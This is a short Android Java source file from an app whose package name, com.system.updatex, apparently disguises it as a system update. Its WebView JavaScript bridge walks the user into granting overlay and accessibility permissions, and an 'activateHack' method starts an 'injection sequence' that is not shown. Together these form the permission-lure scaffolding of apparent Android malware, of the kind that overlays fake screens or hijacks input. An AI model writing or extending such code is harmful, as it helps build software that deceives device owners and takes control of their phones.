package com.system.updatex;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.provider.Settings;
import android.webkit.JavascriptInterface;
import android.widget.Toast;

public class WebAppInterface {
    Context mContext;
    MainActivity mainActivity;

    WebAppInterface(Context c, MainActivity activity) {
        mContext = c;
        mainActivity = activity;
    }

    @JavascriptInterface
    public void grantOverlay() {
        if (!Settings.canDrawOverlays(mContext)) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + mContext.getPackageName()));
            mContext.startActivity(intent);
        } else {
            mainActivity.runOnUiThread(() -> Toast.makeText(mContext, "Overlay already granted", Toast.LENGTH_SHORT).show());
        }
    }

    @JavascriptInterface
    public void grantAccessibility() {
        Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
        mContext.startActivity(intent);
    }

    @JavascriptInterface
    public void activateHack() {
        mainActivity.startInjectionSequence();
    }
}
